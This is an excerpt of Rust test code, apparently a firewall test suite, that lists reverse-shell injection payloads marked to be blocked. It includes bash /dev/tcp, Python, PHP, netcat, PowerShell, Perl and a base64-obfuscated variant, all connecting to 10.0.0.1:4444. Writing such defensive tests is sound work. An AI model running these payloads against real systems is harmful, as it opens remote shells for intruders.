...
pub fn owasp_test_suite() -> Vec<AttackPayload> {
    vec![
        ...
        // ─── A03:2021 — Injection (Reverse Shells) ───────────────────
        AttackPayload {
            id: "REVSHELL-001",
            category: "Reverse Shell",
            description: "Bash /dev/tcp payload",
            path: "/api/exec",
            query: "",
            body: "cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            method: "POST",
            headers: vec![],
            expect_blocked: true,
        },
        AttackPayload {
            id: "REVSHELL-002",
            category: "Reverse Shell",
            description: "Python socket pty payload",
            path: "/api/exec",
            query: "",
            body: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);import pty;pty.spawn(\"/bin/bash\")'",
            method: "POST",
            headers: vec![],
            expect_blocked: true,
        },
        AttackPayload {
            id: "REVSHELL-003",
            category: "Reverse Shell",
            description: "PHP fsockopen payload",
            path: "/api/exec",
            query: "",
            body: "<?php $sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
            method: "POST",
            headers: vec![],
            expect_blocked: true,
        },
        AttackPayload {
            id: "REVSHELL-004",
            category: "Reverse Shell",
            description: "Netcat -e payload",
            path: "/api/exec",
            query: "cmd=nc -e /bin/bash 10.0.0.1 4444",
            body: "",
            method: "GET",
            headers: vec![],
            expect_blocked: true,
        ...
        AttackPayload {
            id: "REVSHELL-005",
            category: "Reverse Shell",
            description: "PowerShell TCPClient payload",
            path: "/api/exec",
            query: "cmd=powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);\"",
            body: "",
            method: "GET",
            headers: vec![],
            expect_blocked: true,
        ...
        AttackPayload {
            id: "REVSHELL-006",
            category: "Reverse Shell",
            description: "Perl Socket payload",
            path: "/api/exec",
            query: "",
            body: "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");exec(\"/bin/sh -i\");};'",
            method: "POST",
            headers: vec![],
            expect_blocked: true,
        },
        AttackPayload {
            id: "REVSHELL-007",
            category: "Reverse Shell",
            description: "Obfuscated base64 pipe payload",
            path: "/api/exec",
            query: "cmd=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh",
            body: "",
            method: "GET",
            headers: vec![],
            expect_blocked: true,
